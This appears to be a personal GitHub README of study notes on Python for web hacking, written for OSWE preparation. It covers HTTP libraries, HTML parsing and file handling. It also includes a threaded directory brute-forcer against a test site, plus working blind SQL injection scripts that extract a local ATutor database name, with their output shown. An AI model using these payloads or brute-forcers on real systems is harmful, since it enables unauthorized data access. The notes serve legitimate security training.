`Updated`
## ¶‣ 𝐏𝐲𝐭𝐡𝐨𝐧 𝐟𝐨𝐫 𝐖𝐞𝐛 𝐇𝐚𝐜𝐤𝐞𝐫𝐬


```
I once made plans to study python for OSCP but never did it till the end.
Preparing for OSWE now coz I feel like learning when
I'm doing web stuff and I don't get that same feeling with OSCP Windows/Linux stuff.
Will Try completing this + Gonna rename the repository!
```

> - Foot Notes
> 	- [Black Hat Python, 2nd Edition](https://g.co/kgs/HUzxMJ)
> 	- Python Official Documentation
> 	- Random Google Searches
> 	- YouTube videos


<div align=center>
<br>
	<img src=https://user-images.githubusercontent.com/68887544/205484574-6e96236c-d7e3-4bb7-895f-9647b83c6831.png height=500px>
	<br>
	<p><code>Img Credit: https://www.reddit.com/r/Python/comments/gftejm/i_redesign_the_python_logo_to_make_it_more_modern/</code></p>
<br>
</div>

---

```
Objective:
```
```
By creating a few different tools, you should learn the fundamental
skills you'll need to build any type of web application assessment tool
that your particular attack scenario calls for.
```

### Table of Content

```
- Learn Python
- Web Hacking
> - Python Libraries for Web
> 	- `urllib2` for python 2.x
> 	- `urllib` for python 3.x
> 	- requests library
> 	- lxml and BeautifulSoup packages
> - Multi-threading
- Quick Notes:
> - OS Module

```

### Learn Python

> - [Python Programming Beginners Tutorial](https://youtu.be/YYXdXT2l-Gg)
> - [World's Best Python (anything and everything related to python) Tutorials (I think)](https://www.youtube.com/playlist?list=PL-osiE80TeTt2d9bfVyTiXJA-UTHn6WwU)
> - [Python OS Module](https://youtu.be/tJxcKyFMTGo)
> - [Python Read and Write to files](https://youtu.be/Uh2ebFW8OYM)
> - [Python Requests Module](https://youtu.be/tb8gHvYlCFs)
> - [Python re Module](https://youtu.be/K8L6KVGG-7o)
> - [Python BeautifulSoup Module](https://youtu.be/ng2o98k983k)
> - [Python JSON Module](https://youtu.be/9N6a-VLBa2I)
> - [Python Itertools Module](https://youtu.be/Qu3dThVy6KQ)
> - [Send Emails using python](https://youtu.be/JRCJ6RtE3xU)
> - [Python Requests-HTML Module](https://youtu.be/a6fIbtFB46g)
> - [Python Subprocess Module](https://youtu.be/2Fp1N6dof0Y)
> - [Python Threading Module](https://youtu.be/IEEhzQoKtQU)
> - [Python Multiprocessing Module](https://youtu.be/fKl2JW_qrso)
> - [Python Zip Files Tutorial](https://youtu.be/z0gguhEmWiY)


## Python Libraries for Web

- `urllib2` for python 2.x

> - It's part of the python standard library.
> - Code to make a Simple GET request to a website:
```python
import urllib2
url = 'https://www.google.com/'
response = urllib2.urlopen(url) # GET
print(response.read())
response.close()
```

---

- `urllib` for python 3.x
> - Part of the python standard library
> - Code to make a Simple GET request to a website:
```python
import urllib.parse
import urllib.request

url = 'https://www.google.com/'
with urllib.request.urlopen(url) as response: # GET
	content = response.read()
print(content)
```


> - make a simple POST request
```python
info = {'user':'blackhat', 'passwd':'1337'}
data = urllib.parse.urlencode(info).encode()    # data is now of type bytes
req = urllib.request.Request(url, data)
with urllib.request.urlopen(req) as response: 	# POST
	content = response.read()

print(content)
```

---

- `requests` library
> - Not part of the standard library
> - Hence installation is required:
> ```python
> pip install requests
> ```


> - Importing
> ```python
> import requests
> ```


> - Methods
> ```python
> r = requests.get(url)
> r = requests.post(url, data={'key':'value'})
> r = requests.put(url, data={'key':'value'})
> r = requests.delete(url)
> r = requests.head(url)
> r = requests.options(url)
> ```


> - Print Request URL
> ```python
> print(r.url)
> ```


> - Passing params in URLs via GET
> ```python
> payload = {'key1': 'value1', 'key2': 'value2'}
> r = requests.get('https://httpbin.org/get', params=payload)
> ```


> - Passing a list of items
> ```python
> payload = {'key1': 'value1', 'key2': ['value2', 'value3']}
>
> r = requests.get('https://httpbin.org/get', params=payload)
> print(r.url)
> ```


> - Get Response Content in binary form:
> ```python
> r.content
> ```
> ```
> Output:
> b'[{"repository":{"open_issues":0,"url":"https://github.com/...
> ```


> - Get Response Content in JSON Format:
> ```python
> r.json()
> ```
> ```
> [{'repository': {'open_issues': 0, 'url': 'https://github.com/...
> ```


> - Get raw response content
> ```python
> r.raw.read(10)
> ```
> ```
> Output:
> '\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
> ```



> - Add custom header
> ```python
> url = 'https://api.github.com/some/endpoint'
> headers = {'user-agent': 'my-app/0.0.1'}
>
> r = requests.get(url, headers=headers)
> ```


> - POST a multipart-encoded file
> ```python
> url = 'https://httpbin.org/post'
> files = {'file': open('report.xls', 'rb')}
>
> r = requests.post(url, files=files)
> r.text
> ```


> - Get Status Code
> ```python
> r.status_code
> ```


> - Get Response Header
> ```python
> r.headers
> ```


> - Get Cookies
> ```python
> r.cookies
> ```


> - Sending our own cookies
> ```python
> cookies = dict(cookies_are='working')
>
> r = requests.get(url, cookies=cookies)
> r.text
> ```

---

- `lxml` and `BeautifulSoup` packages

> - The `lxml` package provides a slightly faster parser, while the `BeautifulSoup` package has logic to automatically detect the target HTML page's encoding.
> - Installation
> ```python
> pip install lxml
> pip install BeautifulSoup
> ```

> - Suppose we are having the HTML content from a request stored in a variable named `content`. Using `lxml`, we could retrive the content and parse the links as follows:
> ```python
> from io import BytesIO
> from lxml import etree
>
> import requests
>
> url = 'https://www.example.com'
> r = requests.get(url)
> content = r.content 	# content is of type 'bytes'
>
> parser = etree.HTMLParser()
> content = etree.parse(BytesIO(content), parser=parser) 		# Parse into > tree
> for link in content.findall('//a'):			# find all "a" anchor elements
> 	print(f"{link.get('href')} -> {link.text}")
> ```
> ```
> Note: I think this only works for python 3.6 or below
> ```

> - Same thing Using `BeautifulSoup`
> ```python
> from bs4 import BeautifulSoup as bs
> import requests
> url = "https://www.google.com"
> r = requests.get(url)
> tree = bs(r.text, 'html.parser') 	# Parse into tree
> for link in tree.find_all('a'):		# find all "a" anchor elements
> 	print(f"{link.get('href')} -> {link.text}")
> ```

---

- Python Multi-threading:

> - We will be using Python `Queue` objects which is thread-safe and we won't have race condition.
> - Let's understand this by creating a file brute-forcing tool.
>
```python
import queue
import threading
import urllib.error
import urllib.parse
import urllib.request

threads = 50
target_url = "http://testphp.vulnweb.com"
wordlist_file = "all.txt"  # from SVNDigger
resume = None
user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) " \
             "Gecko/20100101 " \
             "Firefox/19.0"


def build_wordlist(wordlst_file):
    # read in the word list
    fd = open(wordlst_file, "r")
    raw_words = [line.rstrip('\n') for line in fd]
    fd.close()

    found_resume = False
    words = queue.Queue()

    for word in raw_words:
        if resume:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: %s" % resume)
        else:
            words.put(word)
    return words


def dir_bruter(extensions=None):
    while not word_queue.empty():
        attempt = word_queue.get()
        attempt_list = []

        # check if there is a file extension if not
        # it's a directory path we're bruting
        if "." not in attempt:
            attempt_list.append("/%s/" % attempt)
        else:
            attempt_list.append("/%s" % attempt)

        # if we want to bruteforce extensions
        if extensions:
            for extension in extensions:
                attempt_list.append("/%s%s" % (attempt, extension))

        # iterate over our list of attempts        
        for brute in attempt_list:
            url = "%s%s" % (target_url, urllib.parse.quote(brute))
            try:
                headers = {"User-Agent": user_agent}
                r = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(r)
                if len(response.read()):
                    print("[%d] => %s" % (response.code, url))
            except urllib.error.HTTPError as e:
                if e.code != 404:
                    print("!!! %d => %s" % (e.code, url))
                pass


word_queue = build_wordlist(wordlist_file)
file_extensions = [".php", ".bak", ".orig", ".inc"]

for i in range(threads):
    t = threading.Thread(target=dir_bruter, args=(file_extensions,))
    t.start()
```

---

- Retrieving the length of database name
> - Script:
> ```python
> import multiprocessing as mp
> import requests
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
>
> def db_length(number):
>     payload = f"te')/**/or/**/(length(database()))={number}#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     content_length = int(r.headers['Content-length'])
>     if content_length > 20:
>         print(number)
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
>     processes = []
>     for number in range(30):
>         p = mp.Process(target=db_length, args=[number])
>         p.start()
>         processes.append(p)
>     for process in processes:
>         process.join()
>
>     
> ```
> - Output:
> ```
>  python .\atutor_dblength.py
> [*] Retreiving Database Length:
> [*] Database length: 6
> ```

---


- Retrieving the database name

> - Script:
> ```python
> import requests
> import concurrent.futures
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
> final_string = {}
>
> def db_length(number):
>     payload = f"te')/**/or/**/(length(database()))={number}#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     content_length = int(r.headers['Content-length'])
>     if content_length > 20:
>         return number
>
>     
> def atutor_dbRetrieval(l):
>     for j in range(32, 256):
>         payload = f"te')/**/or/**/(select/**/ascii(substring(database(),{l},1))={j})#"
>         param = {'q': payload}
>         r = requests.get(target, param)
>         content_length = int(r.headers['Content-length'])
>         if content_length > 20:
>             final_string[l-1] = chr(j)
>             print(''.join(final_string[i] for i in sorted(final_string.keys())))
>             
>
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
>     
>     db_len = 0
>     with concurrent.futures.ProcessPoolExecutor() as executor:
>         results = [executor.submit(db_length, _) for _ in range(30)]
>         
>         for f in concurrent.futures.as_completed(results):
>             if f.result() != None:
>                 db_len = f.result()
>     print(db_len)
>         
>     print("[+] Retrieving Database name: ....")
>     with concurrent.futures.ThreadPoolExecutor() as executor:
>         results = [executor.submit(atutor_dbRetrieval, index) for index in range(db_len+1)]
>
>     print("[+] Database Name: ", end=" ")
>     print(''.join(final_string[i] for i in sorted(final_string.keys())))
>     print("[+] Done")
> ```
> ```
> Output:
> python .\atutor_dbRetrieval-fast.py
> [*] Retreiving Database Length:
> [*] Database length:  6
> [+] Retrieving Database name: ....
> a
> ao
> aor
> ator
> attor
> atutor
> [+] Database Name:  atutor
> [+] Done
> ```

---



## Quick Notes:

- OS Module
> ```
> + os.getcwd()                      => get curret working directory
> + os.chdir(<path>)                 => change directory
> + os.listdir()	                   => list directory
> + os.mkdir(<dirname>)              => create a directory
> + os.makedirs(<dirname>)           => make directories recursively
> + os.rmdir(<dirname>)	             => remove directory
> + os.removedirs(<dirname>)         => remove directory recursively
> + os.rename(<from>, <to>)          => rename file
> + os.stat(<filename>)              => print all info of a file
> + os.walk(<path>)	                 => traverse directory recursively
> + os.environ		                   => get environment variables
> + os.path.join(<path>, <file>)     => join path without worrying about /
> + os.path.basename(<filename>)     => get basename
> + os.path.dirname(<filename>)      => get dirname
> + os.path.exists(<path-to-file>)   => check if the path exists or not
> + os.path.splitext(<path-to-file>) => split path and file extension
> + dir(os)			                     => check what methods exists
>
> ```

---

- Reading and Writing to a file
> - Open file in read mode:
> ```python
> with open('test.txt', 'r') as f:
> ```

> - Read file
> ```python
> with open('test.txt', 'r') as f:
>    f_contents = f.read()
> 	 print(f_contents)
> ```

> - Get all lines into a list
> ```python
> with open('test.txt', 'r') as f:
>    f_contents = f.readlines()
> 	 print(f_contents)
> ```

> - Read 1 line at a time
> ```python
> with open('test.txt', 'r') as f:
>    f_contents = f.readline()
> 	 print(f_contents)
> ```
> - Note: Everytime we use readline() function, it reads the next line of the file
> - Example:
> ```python
> with open('test.txt', 'r') as f:
>    f_contents = f.readline()
> 	 print(f_contents, end='')
>
>    f_contents = f.readline()
> 	 print(f_contents)
> ```

> - Another way of reading file (I guess most efficient)
> ```python
> with open('test.txt', 'r') as f:
> 	for line in f:
> 		print(line, end='')
> ```

> - Go back to start of the file
> ```python
> f.seek(0)
> ```

> - Writing to a file
> ```python
> with open('test2.txt', 'w') as f:
> 	f.write('Test')
> ```
> - Note: `w` will overwrite the file, so use `a` if you wanna append

> - Append to a file
> ```python
> with open('test2.txt', 'a') as f:
> 	f.write('Test')
> ```

> - Read and write to a file at the same time
> ```python
> with open('test.txt', 'r') as rf:
> 	with open('test_copy.txt', 'w') as wf:
> 		for line in rf:
> 			wf.write(line)
> ```
